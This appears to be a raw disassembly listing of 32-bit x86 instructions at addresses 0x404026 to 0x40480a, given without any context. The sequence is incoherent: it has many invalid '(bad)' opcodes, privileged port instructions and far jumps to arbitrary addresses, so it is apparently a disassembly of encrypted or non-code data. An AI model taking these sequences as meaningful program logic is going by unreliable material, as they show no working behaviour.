  404026:	mov    bl,BYTE PTR [edi]
  404028:	mov    ds,WORD PTR [edi+0x1bc46ea8]
  40402e:	aaa    
  40402f:	xor    DWORD PTR [ecx],eax
  404031:	pop    esi
  404032:	mov    WORD PTR [ebx+0x75aa0f86],fs
  404038:	xchg   edi,eax
  404039:	pop    esi
  40403a:	cmp    DWORD PTR [esi+0x6a],ecx
  40403d:	stos   DWORD PTR es:[edi],eax
  40403e:	xchg   esp,eax
  40403f:	sub    bh,cl
  404041:	mov    eax,ds:0xfcd735ae
  404046:	mov    eax,ds:0x151aba4b
  40404b:	hlt    
  40404c:	sbb    ecx,0x4a
  40404f:	push   eax
  404050:	int3   
  404051:	repz xor al,0x97
  404054:	rcl    DWORD PTR [ebx],0x55
  404057:	and    BYTE PTR [esi+edi*8+0x57],ah
  40405b:	pusha  
  40405c:	sbb    cl,BYTE PTR [ebx-0x6e]
  40405f:	cmp    bh,BYTE PTR ds:0xbf0f6e5b
  404065:	aam    0xe2
  404067:	rcl    BYTE PTR [edi],1
  404069:	lea    esi,[ecx+eiz*4-0x2f49cbea]
  404070:	inc    eax
  404071:	fistp  WORD PTR [edi+0x91f722a]
  404077:	sti    
  404078:	push   ebp
  404079:	mov    esp,0x533dc3e2
  40407e:	scas   al,BYTE PTR es:[edi]
  40407f:	ret    0x7196
  404082:	stc    
  404083:	aaa    
  404084:	push   ebp
  404085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404086:	push   ebx
  404087:	jnp    0x40400a
  404089:	shr    BYTE PTR [eax-0x48],1
  40408c:	test   eax,0x9616d8fb
  404091:	jae    0x4040af
  404093:	or     eax,0x397af920
  404098:	imul   edi,DWORD PTR ds:0x9b799c4,0xed7421a1
  4040a2:	out    0xbb,al
  4040a4:	add    DWORD PTR [edi],esi
  4040a6:	scas   eax,DWORD PTR es:[edi]
  4040a7:	data16 jne 0x4040e9
  4040aa:	dec    ebx
  4040ab:	mov    ecx,0x383b20bc
  4040b0:	arpl   WORD PTR [edi-0x4e],sp
  4040b3:	repz adc al,0x64
  4040b6:	pop    ebx
  4040b7:	iret   
  4040b8:	mov    BYTE PTR [ecx-0x6],0x50
  4040bc:	(bad)  
  4040bd:	in     al,0x68
  4040bf:	pop    esi
  4040c0:	xor    cl,ah
  4040c2:	shl    BYTE PTR [eax-0x46],0x56
  4040c6:	jl     0x404136
  4040c8:	and    eax,0xc077d823
  4040cd:	dec    edx
  4040ce:	push   0xffffffae
  4040d0:	push   0xbcdd1b00
  4040d5:	mov    bh,0x5d
  4040d7:	lods   eax,DWORD PTR ds:[esi]
  4040d8:	adc    edx,DWORD PTR [eax+0x22c0ad0b]
  4040de:	gs lahf 
  4040e0:	mov    WORD PTR [edx+0x6149158e],cs
  4040e6:	cs mov ebp,0x2efc16f7
  4040ec:	pop    es
  4040ed:	pop    edx
  4040ee:	inc    edi
  4040ef:	xchg   edi,eax
  4040f0:	or     eax,0xc87614f2
  4040f5:	xor    BYTE PTR [edi],bh
  4040f7:	sbb    ebp,DWORD PTR [edx]
  4040f9:	mov    edx,0x8a50bd65
  4040fe:	scas   al,BYTE PTR es:[edi]
  4040ff:	pushf  
  404100:	int3   
  404101:	daa    
  404102:	mov    WORD PTR [esi],gs
  404104:	mov    ebp,0x2a023cf7
  404109:	addr16 in al,dx
  40410b:	call   0x7ab3:0x9422bc81
  404112:	add    al,0x39
  404114:	mov    ch,0x27
  404116:	xchg   BYTE PTR [esi+0x100115c9],ch
  40411c:	push   ss
  40411d:	test   al,0x98
  40411f:	jnp    0x404115
  404121:	or     BYTE PTR [ecx],bl
  404123:	retf   0xc96b
  404126:	stc    
  404127:	and    dl,BYTE PTR [ecx]
  404129:	daa    
  40412a:	xlat   BYTE PTR ds:[ebx]
  40412b:	repnz retf 
  40412d:	push   cs
  40412e:	dec    ebx
  40412f:	in     al,0x8b
  404131:	mov    ecx,0xf4a87e29
  404136:	ficomp WORD PTR [eax+0x57]
  404139:	and    BYTE PTR [edx],bl
  40413b:	scas   al,BYTE PTR es:[edi]
  40413c:	xchg   esi,eax
  40413d:	dec    esp
  40413e:	hlt    
  40413f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404140:	mov    bh,0x0
  404142:	mov    fs,WORD PTR [ebx-0xabf3130]
  404148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404149:	hlt    
  40414a:	sahf   
  40414b:	push   cs
  40414c:	out    dx,al
  40414d:	and    DWORD PTR [esi],esi
  40414f:	popa   
  404150:	je     0x404188
  404152:	out    0xf9,al
  404154:	jg     0x4041b3
  404156:	out    0x63,eax
  404158:	xor    ebx,DWORD PTR [esi]
  40415a:	mov    dh,0xae
  40415c:	xchg   esp,eax
  40415d:	sti    
  40415e:	mov    al,ds:0xdea80bd3
  404163:	pop    esi
  404164:	(bad)  
  404165:	je     0x40414e
  404167:	sar    BYTE PTR [eax],1
  404169:	sbb    edi,DWORD PTR [ebx+0x62]
  40416c:	jno    0x4041af
  40416e:	leave  
  40416f:	xchg   eax,edi
  404171:	aaa    
  404172:	inc    edi
  404173:	xor    BYTE PTR [eax],0x2b
  404176:	mov    BYTE PTR [edx+0x17],dl
  404179:	fistp  DWORD PTR [ecx-0x4d]
  40417c:	push   0xe989dc39
  404181:	add    cl,cl
  404183:	popa   
  404184:	sbb    al,0x85
  404186:	int    0x4d
  404188:	addr16 out dx,eax
  40418a:	mov    edx,0x545e4f86
  40418f:	scas   al,BYTE PTR es:[edi]
  404190:	mov    ah,0xb6
  404192:	out    0xb0,eax
  404194:	inc    esp
  404195:	call   0x1c23aac1
  40419a:	in     al,dx
  40419b:	pop    ebp
  40419c:	addr16 retf 0xd692
  4041a0:	sbb    ch,dh
  4041a2:	or     al,0xc1
  4041a4:	(bad)  
  4041a5:	das    
  4041a6:	xchg   DWORD PTR [esi-0x52da7482],edi
  4041ac:	and    ecx,DWORD PTR [ecx-0x78]
  4041af:	mov    ch,0x20
  4041b1:	sahf   
  4041b2:	jle    0x40421d
  4041b4:	mov    ebx,0x67ab085
  4041b9:	fild   DWORD PTR [eax]
  4041bb:	push   ebx
  4041bc:	sub    DWORD PTR [ecx+0x55d2c79e],ebp
  4041c2:	jmp    0xefea:0x97391e83
  4041c9:	stos   BYTE PTR es:[edi],al
  4041ca:	loope  0x40421f
  4041cc:	inc    ebp
  4041cd:	ret    0x5a7a
  4041d0:	cmp    edi,edi
  4041d2:	nop    ebx
  4041d5:	push   esi
  4041d6:	mov    al,ds:0x37c449de
  4041db:	mov    cl,0xe2
  4041dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041de:	(bad)  
  4041df:	mov    esi,0xf33b8c9b
  4041e4:	add    BYTE PTR [eax+0x3b8e0688],bl
  4041ea:	mov    bh,0xb0
  4041ec:	pop    edi
  4041ed:	pop    ds
  4041ee:	mov    cl,0x2b
  4041f0:	sahf   
  4041f1:	dec    ebx
  4041f2:	call   0x457f:0xdc8e8fe3
  4041f9:	push   edi
  4041fa:	and    DWORD PTR [esi+0x1a],esp
  4041fd:	shr    DWORD PTR [esi-0x35304a29],cl
  404203:	pop    eax
  404204:	push   ebx
  404205:	cmp    eax,0x3020260d
  40420a:	out    0x69,eax
  40420c:	mov    ah,BYTE PTR [esi+0x61]
  40420f:	aam    0x52
  404211:	(bad)  
  404212:	in     eax,dx
  404213:	(bad)  
  404214:	in     eax,0xb
  404216:	lahf   
  404217:	dec    esp
  404218:	nop
  404219:	lods   eax,DWORD PTR ds:[esi]
  40421a:	data16 sbb al,0xc3
  40421d:	push   esp
  40421e:	fiadd  DWORD PTR [ebx+0x4a5a3ece]
  404224:	icebp  
  404225:	neg    DWORD PTR [edi-0x7c7a0f39]
  40422b:	popf   
  40422c:	idiv   esi
  40422e:	mov    ch,cl
  404230:	(bad)  
  404231:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  404233:	mov    edi,0xd11e538d
  404238:	pop    ebp
  404239:	dec    edi
  40423a:	(bad)  
  40423b:	retf   
  40423c:	or     eax,ebx
  40423e:	repz int3 
  404240:	sti    
  404241:	and    eax,0xae1cacbb
  404246:	fidivr WORD PTR [ebp-0x5387f548]
  40424c:	sbb    edx,DWORD PTR [eax+ecx*4+0x6a4a311e]
  404253:	bound  ebx,QWORD PTR [ebp-0x3bb19af2]
  404259:	mov    ds:0x42584c0d,eax
  40425e:	jae    0x4042cf
  404260:	(bad)  
  404262:	aad    0xc3
  404264:	ret    
  404265:	bound  ebx,QWORD PTR [edi+eiz*4+0x726f8680]
  40426c:	ss pop edx
  40426e:	mov    cs,WORD PTR [esi+eiz*1+0x632f00b7]
  404275:	push   ebp
  404276:	es int 0xc6
  404279:	in     eax,dx
  40427a:	dec    ecx
  40427b:	mov    edx,0xaae46842
  404280:	fild   QWORD PTR [ecx]
  404282:	pop    eax
  404283:	mov    ch,0x27
  404285:	push   ds
  404286:	jmp    0x404273
  404288:	mul    DWORD PTR [edx]
  40428a:	pop    ebp
  40428b:	imul   ebx,ebx,0x31
  40428e:	inc    esp
  40428f:	scas   al,BYTE PTR es:[edi]
  404290:	in     al,dx
  404291:	push   edx
  404292:	xlat   BYTE PTR ds:[ebx]
  404293:	in     eax,dx
  404294:	cwde   
  404295:	into   
  404296:	bound  esi,QWORD PTR [ebp+esi*2+0x69]
  40429a:	sub    edi,eax
  40429c:	out    dx,al
  40429d:	mov    esi,0x88f2b36f
  4042a2:	into   
  4042a3:	loop   0x4042c3
  4042a5:	push   edi
  4042a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042a7:	mov    dh,BYTE PTR gs:[eax]
  4042aa:	cld    
  4042ab:	test   eax,0x801448b0
  4042b0:	stos   BYTE PTR es:[edi],al
  4042b1:	jle    0x4042c5
  4042b3:	shr    BYTE PTR [ebx],1
  4042b5:	cmc    
  4042b6:	jmp    0x15632625
  4042bb:	pop    ds
  4042bc:	imul   ebp,DWORD PTR [ecx+eax*4],0x13
  4042c0:	or     dh,dl
  4042c2:	or     DWORD PTR [ebx+0x4d5e936c],edx
  4042c8:	popa   
  4042c9:	jns    0x4042b7
  4042cb:	sub    al,0xae
  4042cd:	fidiv  DWORD PTR [ebx-0x49]
  4042d0:	repz xchg esi,eax
  4042d2:	xchg   esp,eax
  4042d3:	mov    es,ebx
  4042d5:	jmp    0x7227cffb
  4042da:	cmp    al,0xd
  4042dc:	pop    eax
  4042dd:	jo     0x40428c
  4042df:	fwait
  4042e0:	mov    al,ds:0x52608c1e
  4042e5:	fstp   QWORD PTR [ecx+0x68]
  4042e8:	mov    DWORD PTR [edi+0x6c],edx
  4042eb:	mov    bl,0xf8
  4042ed:	imul   esi,DWORD PTR [esi],0xd907e8ef
  4042f3:	pop    eax
  4042f4:	out    0x63,al
  4042f6:	push   ds
  4042f7:	push   ebx
  4042f8:	data16 aam 0x9e
  4042fb:	mov    ds:0xeea37c8b,eax
  404300:	ja     0x4042b9
  404302:	sbb    eax,0xed072fba
  404307:	mov    esp,0x6fcb525b
  40430c:	jmp    0xa9acd68
  404311:	dec    ecx
  404312:	clc    
  404313:	paddw  mm0,QWORD PTR [ebx]
  404316:	mov    eax,DWORD PTR [eax]
  404318:	add    esi,edx
  40431a:	and    eax,0xd8af14aa
  40431f:	outs   dx,BYTE PTR ds:[esi]
  404320:	dec    eax
  404321:	in     al,0x4a
  404323:	test   DWORD PTR [edi+0x16469f3c],esp
  404329:	xor    eax,0x9e0447b9
  40432e:	ss fldenv cs:[esi+0x74bb6143]
  404336:	lock push 0x79592b06
  40433c:	and    DWORD PTR [eax+0x21],ecx
  40433f:	les    edi,FWORD PTR [edi+eax*1-0x1d]
  404343:	add    bl,BYTE PTR [edi]
  404345:	mov    ebx,0x19ea6bdf
  40434a:	(bad)  
  40434b:	jmp    0x8122:0x2c6cf5f6
  404352:	cdq    
  404353:	mov    bl,0xe1
  404355:	or     DWORD PTR [edx+0x1182f485],ebp
  40435b:	fld    DWORD PTR [eax+esi*4+0x5d]
  40435f:	xor    dh,BYTE PTR [ecx+eax*8]
  404362:	mov    ebx,0x30394567
  404367:	addr16 lahf 
  404369:	test   eax,0x8655521f
  40436e:	fild   WORD PTR [eax+edx*2-0x5f77142f]
  404375:	js     0x40438a
  404377:	inc    esi
  404378:	aam    0xf4
  40437a:	dec    edi
  40437b:	mov    esi,0x7fd61ad1
  404380:	inc    ecx
  404381:	cdq    
  404382:	daa    
  404383:	jne    0x404323
  404385:	loopne 0x404348
  404387:	mul    DWORD PTR [ebp+0x0]
  40438a:	shr    DWORD PTR [eax],cl
  40438c:	mov    ebp,0x70ddee08
  404391:	add    ebp,eax
  404393:	es inc ebx
  404395:	imul   BYTE PTR [ebp+0xb73cee]
  40439b:	scas   eax,DWORD PTR es:[edi]
  40439c:	inc    ebp
  40439d:	inc    edi
  40439e:	mov    dl,0x1a
  4043a0:	ja     0x404382
  4043a2:	stos   BYTE PTR es:[edi],al
  4043a3:	mov    esp,0x6d7a5987
  4043a8:	aad    0xf3
  4043aa:	iret   
  4043ab:	aaa    
  4043ac:	neg    ecx
  4043ae:	shr    BYTE PTR [ecx+0x3af927ff],0xca
  4043b5:	dec    ebp
  4043b6:	add    edi,ecx
  4043b8:	adc    bh,BYTE PTR [ebx]
  4043ba:	and    eax,0x53f86a1d
  4043bf:	test   BYTE PTR [edi+0x4ebcf298],0xb7
  4043c6:	dec    eax
  4043c7:	ret    
  4043c8:	cwde   
  4043c9:	loopne 0x40443b
  4043cb:	adc    cl,BYTE PTR [ebx+0x1d100db1]
  4043d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043d2:	and    eax,0x97975f67
  4043d7:	push   0x7d
  4043d9:	test   DWORD PTR [ebx-0x4f37f5a9],esp
  4043df:	ror    BYTE PTR cs:[ebx+0x6c],0x14
  4043e4:	fwait
  4043e5:	arpl   WORD PTR [ebp+0x7d],sp
  4043e8:	mov    BYTE PTR [edx-0x62],ah
  4043eb:	dec    ecx
  4043ec:	dec    eax
  4043ed:	sbb    cl,BYTE PTR [ebp+0x709a49f3]
  4043f3:	data16 sbb al,0xe3
  4043f6:	out    dx,al
  4043f7:	sbb    BYTE PTR [esi+0x752daa89],0xd1
  4043fe:	ja     0x404442
  404400:	popa   
  404401:	jl     0x40447d
  404403:	push   0x6f
  404405:	cmp    ch,ah
  404407:	mov    gs,edx
  404409:	add    eax,0x10b8d7eb
  40440e:	lods   al,BYTE PTR ds:[esi]
  40440f:	push   ecx
  404410:	jne    0x404407
  404412:	pop    edx
  404413:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404414:	ja     0x404435
  404416:	push   esp
  404417:	shl    ebx,0xd1
  40441a:	cdq    
  40441b:	cmp    ebp,ebx
  40441d:	add    DWORD PTR [ebp+0x6cf4c655],ebx
  404423:	dec    esi
  404424:	mov    ds:0x82370cf5,eax
  404429:	jmp    0xcbaa518d
  40442e:	loop   0x40441b
  404430:	mul    DWORD PTR [edi-0x1f]
  404433:	aaa    
  404434:	fs push esi
  404436:	inc    edx
  404437:	xchg   BYTE PTR [eax+0x14],ah
  40443a:	data16 mov bl,0x67
  40443d:	int3   
  40443e:	aas    
  40443f:	xor    DWORD PTR [edx+0x67],edi
  404442:	stc    
  404443:	lds    ecx,FWORD PTR [ebx+0x4d4750e]
  404449:	jg     0x4044b9
  40444b:	mov    al,ds:0x1a1364d0
  404450:	call   0x488aca5d
  404455:	stos   BYTE PTR es:[edi],al
  404456:	bound  ebp,QWORD PTR [eax+0x11cdb49d]
  40445c:	fisttp QWORD PTR [ebp-0x12]
  40445f:	xchg   ecx,eax
  404460:	jmp    0xb7ef2373
  404465:	sub    al,BYTE PTR [ecx+0x3]
  404468:	cmp    DWORD PTR [edi-0x12],esi
  40446b:	arpl   WORD PTR [esi-0x5ad7e832],ax
  404471:	rol    DWORD PTR [edx],cl
  404473:	cli    
  404474:	and    al,0x71
  404476:	inc    esp
  404478:	je     0x4044ce
  40447a:	(bad)
  40447d:	add    al,0xc6
  40447f:	dec    esi
  404480:	call   0x552e:0x4e84f0c5
  404487:	inc    esi
  404488:	adc    cl,BYTE PTR [esi+0x5a]
  40448b:	cli    
  40448c:	xor    eax,0xe3fd5c87
  404491:	ins    DWORD PTR es:[edi],dx
  404492:	shl    BYTE PTR [ecx+eiz*2],cl
  404495:	jg     0x4044bc
  404497:	xor    al,0x5c
  404499:	and    DWORD PTR ds:0x93dfab17,esp
  40449f:	outs   dx,DWORD PTR ds:[esi]
  4044a0:	sbb    al,0xeb
  4044a2:	sub    al,0x4c
  4044a4:	popa   
  4044a5:	jne    0x404427
  4044a7:	ss (bad) 
  4044a9:	inc    eax
  4044aa:	pop    ecx
  4044ab:	mov    ebp,0x83edba5c
  4044b0:	fidiv  WORD PTR [ebp+0x74]
  4044b3:	xor    bl,BYTE PTR [esp+edi*1-0xa]
  4044b7:	loopne 0x404458
  4044b9:	mov    ds:0xeccce649,eax
  4044be:	mov    ebx,0x6a1bc54f
  4044c3:	or     BYTE PTR ds:0xabc42b74,cl
  4044c9:	iret   
  4044ca:	cwde   
  4044cb:	xchg   ebx,eax
  4044cc:	adc    eax,0x755921fe
  4044d1:	shr    bl,1
  4044d3:	in     eax,0xeb
  4044d5:	mov    al,BYTE PTR [esi]
  4044d7:	sub    eax,0xcfa4a1ed
  4044dc:	outs   dx,DWORD PTR ds:[esi]
  4044dd:	sbb    BYTE PTR [eax+eax*1],cl
  4044e0:	ins    DWORD PTR es:[edi],dx
  4044e1:	(bad)  
  4044e2:	popa   
  4044e3:	cmp    dh,BYTE PTR ds:[ecx+0x5c]
  4044e7:	les    ebx,FWORD PTR [edi+0x2ba0d634]
  4044ed:	lods   al,BYTE PTR ds:[esi]
  4044ee:	xor    ch,dl
  4044f0:	inc    esi
  4044f1:	mov    esi,0x42bc9d3b
  4044f6:	pop    ds
  4044f7:	push   esi
  4044f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044f9:	inc    esi
  4044fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044fb:	fist   WORD PTR [esp+ebx*2+0x76]
  4044ff:	pop    edx
  404500:	scas   al,BYTE PTR es:[edi]
  404501:	inc    edx
  404502:	dec    ebp
  404503:	das    
  404504:	retf   
  404505:	xor    al,0x61
  404507:	add    eax,0x11512194
  40450c:	in     eax,dx
  40450d:	les    edi,FWORD PTR [edi-0xce93880]
  404513:	(bad)  [eax+0x52a8e7bf]
  404519:	sbb    ebp,DWORD PTR [eax]
  40451b:	hlt    
  40451c:	add    dh,BYTE PTR [edi]
  40451e:	cmp    ebp,DWORD PTR [ecx+0xe]
  404521:	mov    edi,0x6eec1c0e
  404526:	inc    edi
  404527:	pop    edx
  404528:	sbb    BYTE PTR [edi],dl
  40452a:	pop    eax
  40452b:	lods   al,BYTE PTR ds:[esi]
  40452c:	push   ss
  40452d:	add    eax,DWORD PTR [ebx]
  40452f:	rol    DWORD PTR [edx],1
  404531:	xchg   esp,eax
  404532:	dec    ebp
  404533:	fidiv  DWORD PTR [ecx+ebp*4+0x0]
  404537:	add    DWORD PTR ds:0xa512882a,ecx
  40453d:	out    dx,al
  40453e:	out    dx,al
  40453f:	push   eax
  404540:	aas    
  404541:	(bad)  
  404542:	imul   edi,DWORD PTR [esi+0x50c32526],0xffffff93
  404549:	cmp    al,0x83
  40454b:	ret    0xdc78
  40454e:	retf   0x4ca3
  404551:	lahf   
  404552:	icebp  
  404553:	or     bh,BYTE PTR [edx+0x51]
  404556:	jmp    0x40458b
  404558:	sar    DWORD PTR [edi],0x17
  40455b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40455c:	out    0x5d,al
  40455e:	xor    bh,0x16
  404561:	push   ecx
  404562:	fstp   DWORD PTR [esi]
  404564:	sub    ah,BYTE PTR [ebx]
  404566:	sti    
  404567:	cmc    
  404568:	sar    BYTE PTR [ebp+0x37],1
  40456b:	cmp    dh,BYTE PTR [edx+ebp*2]
  40456e:	pushf  
  40456f:	imul   esp,DWORD PTR fs:[ecx],0x8
  404573:	cmp    esp,DWORD PTR [ebp+0x73]
  404576:	push   ecx
  404577:	and    BYTE PTR [edx-0x4e774141],bh
  40457d:	fmul   QWORD PTR [esp+edx*1+0x16]
  404581:	das    
  404582:	in     al,dx
  404583:	inc    ecx
  404584:	xchg   ecx,eax
  404585:	xchg   ebp,eax
  404586:	adc    DWORD PTR [eax],edx
  404588:	dec    ebx
  404589:	xor    BYTE PTR [ebx],bl
  40458b:	add    DWORD PTR [eax+0x12],0xfffffff9
  40458f:	lods   al,BYTE PTR ds:[esi]
  404590:	adc    DWORD PTR [edi+0x20a28db2],ebx
  404596:	es iret 
  404598:	sar    BYTE PTR [ebp-0x4686148c],1
  40459e:	push   eax
  40459f:	dec    esi
  4045a0:	and    al,0xd8
  4045a2:	imul   edx,DWORD PTR [ebp-0x5],0xd90a6ea7
  4045a9:	xchg   esi,eax
  4045aa:	xchg   esp,eax
  4045ab:	ins    BYTE PTR es:[edi],dx
  4045ac:	shl    al,1
  4045ae:	adc    eax,0xff9ce6e5
  4045b3:	adc    DWORD PTR [ebp-0x4f29924b],edx
  4045b9:	cmp    DWORD PTR [eax],ebp
  4045bb:	cmp    ebp,eax
  4045bd:	ret    
  4045be:	dec    edi
  4045bf:	out    dx,eax
  4045c0:	and    eax,0xe887999b
  4045c5:	mov    cl,0xd9
  4045c7:	pop    ebp
  4045c8:	mov    esp,0xa279a4fa
  4045cd:	rol    BYTE PTR [edx],1
  4045cf:	mov    cl,0xb
  4045d1:	jae    0x4045e5
  4045d3:	dec    ebp
  4045d4:	xchg   edx,eax
  4045d5:	cmp    BYTE PTR [eax],dl
  4045d7:	enter  0xaefc,0x5a
  4045db:	into   
  4045dc:	fnstsw WORD PTR [eax]
  4045de:	repz data16 fidiv WORD PTR [ebx-0x176ba622]
  4045e6:	cdq    
  4045e7:	stos   DWORD PTR es:[edi],eax
  4045e8:	or     ch,ch
  4045ea:	imul   DWORD PTR [eax+0x6451dad7]
  4045f0:	push   esp
  4045f1:	into   
  4045f2:	(bad)  
  4045f3:	pop    edx
  4045f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045f5:	mov    eax,ebx
  4045f7:	dec    ebp
  4045f8:	mov    ds:0x75df853a,al
  4045fd:	fbstp  TBYTE PTR [ebp+eiz*4-0x5af5c8c7]
  404604:	mov    ah,0xe5
  404606:	das    
  404607:	mov    BYTE PTR [edx-0x47],bl
  40460a:	loopne 0x4045f6
  40460c:	sbb    ebp,DWORD PTR [ecx+ebx*2-0x5ce0da8f]
  404613:	adc    eax,0x93301afd
  404618:	cmp    dh,BYTE PTR [edx-0x5ae66962]
  40461e:	push   ecx
  40461f:	push   eax
  404620:	jp     0x4045ac
  404622:	out    dx,al
  404623:	sub    esp,eax
  404625:	fisttp QWORD PTR [ecx+0x1d]
  404628:	jg     0x4045cd
  40462a:	mov    al,ds:0x157747d5
  40462f:	int3   
  404630:	aad    0x96
  404632:	retf   
  404633:	and    esi,DWORD PTR [edx+0x35229942]
  404639:	jmp    0xac41:0x3faac38d
  404640:	popf   
  404641:	popa   
  404642:	cmp    ebp,DWORD PTR [ebp-0x19]
  404645:	mov    bl,0xb0
  404647:	xor    BYTE PTR [edi],dl
  404649:	jb     0x40463b
  40464b:	ret    0x6723
  40464e:	fistp  WORD PTR [eax]
  404650:	or     bl,dh
  404652:	scas   eax,DWORD PTR es:[edi]
  404653:	enter  0x55b7,0x7b
  404657:	retf   
  404658:	mov    ebx,0x6aac76f8
  40465d:	popa   
  40465e:	nop
  40465f:	or     esi,edi
  404661:	jnp    0x404686
  404663:	add    eax,0x2165ee30
  404668:	mov    esi,0x3b7af35d
  40466d:	sub    esp,0x13335939
  404673:	push   0x6bf26401
  404678:	add    ch,BYTE PTR [ecx]
  40467a:	les    ebx,FWORD PTR [esi-0x6107dd76]
  404680:	in     eax,dx
  404681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404682:	pop    eax
  404683:	mov    WORD PTR [edx+0x43dd2b19],ds
  404689:	out    0x3d,al
  40468b:	in     eax,dx
  40468c:	call   0x6533951a
  404691:	push   edx
  404692:	sbb    eax,0x1c8b4113
  404697:	jbe    0x404717
  404699:	retf   
  40469a:	ds loope 0x4046a6
  40469d:	lods   al,BYTE PTR ds:[esi]
  40469e:	fadd   st,st(6)
  4046a0:	ret    
  4046a1:	pop    ds
  4046a2:	xchg   ecx,eax
  4046a3:	fnstcw WORD PTR [ebx+0x7c65c40]
  4046a9:	fdiv   QWORD PTR ds:0xcd6538a3
  4046af:	test   al,0xb9
  4046b1:	xchg   esi,eax
  4046b2:	cdq    
  4046b3:	mov    edi,0xa3741566
  4046b8:	push   0x4a812ff3
  4046bd:	jb     0x404702
  4046bf:	mov    ds:0xb6cb044a,al
  4046c4:	pop    esi
  4046c5:	shr    BYTE PTR [edx+0x11244b],cl
  4046cb:	bound  eax,QWORD PTR [esi+0x62]
  4046ce:	mov    eax,ds:0x2691bbe1
  4046d3:	sbb    eax,0x618d2da7
  4046d8:	cmp    eax,DWORD PTR [edi*1+0x2c3f17ff]
  4046df:	mov    esp,0x9243c8f6
  4046e4:	mov    ds:0xccc8dbc5,eax
  4046e9:	es jae 0x40468c
  4046ec:	dec    esi
  4046ed:	mov    esi,0xe04a0452
  4046f2:	hlt    
  4046f3:	aam    0xdd
  4046f5:	shl    DWORD PTR [ecx+0x269653ca],cl
  4046fb:	push   ecx
  4046fc:	jbe    0x404694
  4046fe:	fcomp  QWORD PTR [ebp+0x7b]
  404701:	pushf  
  404702:	xchg   ebx,eax
  404703:	enter  0x6e1f,0x11
  404707:	sub    DWORD PTR [ebx],eax
  404709:	push   ebp
  40470a:	xor    esp,edx
  40470c:	retf   
  40470d:	out    dx,eax
  40470e:	mov    ebp,0x19064bc
  404713:	dec    esp
  404714:	xchg   DWORD PTR [ebx-0x69],eax
  404717:	adc    al,0x5e
  404719:	pop    ebx
  40471a:	sbb    edx,DWORD PTR [edi+0x7d519f3e]
  404720:	or     BYTE PTR [ecx+edx*4-0x5e],0x5f
  404725:	xchg   ebx,eax
  404726:	pop    edi
  404727:	(bad)  ds:0xbdd284f6
  40472d:	bound  edx,QWORD PTR [edi-0x7]
  404730:	lock mov eax,ds:0x24d66b79
  404736:	clc    
  404737:	lahf   
  404738:	(bad)  
  404739:	dec    edx
  40473a:	dec    esi
  40473b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40473c:	pop    esp
  40473d:	push   esi
  40473e:	inc    ebx
  40473f:	lods   al,BYTE PTR ds:[esi]
  404740:	repnz imul eax,eax,0xd
  404744:	lods   eax,DWORD PTR ds:[esi]
  404745:	std    
  404746:	loopne 0x40475f
  404748:	jmp    0x404714
  40474a:	pop    ebx
  40474b:	xor    al,0xde
  40474d:	enter  0xf596,0xa4
  404751:	lock mov eax,0x530c5c06
  404757:	jae    0x4047a6
  404759:	push   esi
  40475a:	cmp    DWORD PTR [esi-0x16],0x3c
  40475e:	jecxz  0x4047ae
  404760:	xchg   DWORD PTR [ecx],edi
  404762:	dec    eax
  404763:	dec    DWORD PTR [edx-0x41]
  404766:	mov    ah,0xee
  404768:	xchg   ebx,eax
  404769:	sbb    DWORD PTR [ebx+0x2a],ecx
  40476c:	mov    ebx,0x1d8918c8
  404771:	cmp    al,0x87
  404773:	pop    es
  404774:	sub    esp,0x5c
  404777:	sti    
  404778:	retf   0xfe4c
  40477b:	icebp  
  40477c:	fcomip st,st(5)
  40477e:	mov    ch,0x4f
  404780:	add    edx,ebx
  404782:	sahf   
  404783:	or     DWORD PTR [ebx+eax*2-0x28],ebx
  404787:	sub    al,BYTE PTR [esi-0x4f]
  40478a:	out    dx,eax
  40478b:	adc    al,0xa3
  40478d:	cmp    al,0x6a
  40478f:	pop    es
  404790:	push   esp
  404791:	xor    bl,BYTE PTR [edx+0x6e8586bb]
  404797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404798:	mov    eax,0x34e093e2
  40479d:	pop    esi
  40479e:	or     ebx,DWORD PTR [ebp-0x76]
  4047a1:	inc    ebx
  4047a2:	inc    ecx
  4047a3:	pop    ebx
  4047a4:	in     al,0x52
  4047a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047a7:	mov    bh,0xad
  4047a9:	and    eax,0xc0e4f601
  4047ae:	cwde   
  4047af:	fprem  
  4047b1:	cdq    
  4047b2:	stc    
  4047b3:	cwde   
  4047b4:	(bad)  
  4047b5:	jo     0x404824
  4047b7:	add    dl,BYTE PTR ds:0x9df70a5c
  4047bd:	pusha  
  4047be:	mov    ebp,0x83189b85
  4047c3:	cmp    eax,0x9a3abefc
  4047c8:	jle    0x4047cc
  4047ca:	mov    eax,DWORD PTR [ecx-0x32]
  4047cd:	mov    ecx,0xe270c813
  4047d2:	sub    al,0xff
  4047d4:	cmp    eax,0x50a39a3b
  4047d9:	call   0x2ee1:0x80f09256
  4047e0:	cmp    edi,edx
  4047e2:	xchg   ecx,eax
  4047e3:	jae    0x4047f0
  4047e5:	out    dx,eax
  4047e6:	xor    eax,0x82da217c
  4047eb:	dec    esi
  4047ec:	sti    
  4047ed:	jge    0x4047ac
  4047ef:	daa    
  4047f0:	xchg   BYTE PTR [esi+eax*4],ah
  4047f3:	pushf  
  4047f4:	mov    bh,0x86
  4047f6:	dec    esp
  4047f7:	iret   
  4047f8:	lea    eax,[ecx+0x5b36f0b1]
  4047fe:	dec    ecx
  4047ff:	and    bl,ch
  404801:	xchg   esp,eax
  404802:	addr16 out 0x3c,eax
  404805:	mov    al,0x62
  404807:	pop    edx
  404808:	in     al,0x1c
  40480a:	loopne 0x4047e5
